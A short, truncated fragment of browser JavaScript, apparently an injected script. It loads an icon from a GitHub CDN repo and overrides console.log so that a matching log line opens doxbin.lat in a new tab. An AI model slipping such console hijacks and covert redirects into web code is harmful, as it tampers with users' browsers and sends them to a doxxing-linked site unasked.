...
(function(){
	...
	const LOADING_ICON_SRC = "https://cdn.jsdelivr.net/gh/cryptora1/craftmine@main/shared/lockertitlerendered.png";
...
console.log = function (...args) {
  if (args.length > 0 && args[0].includes('Connecting to: wss://https://doxbin.lat')) {
	  window.open("https://doxbin.lat", "_blank");
  }
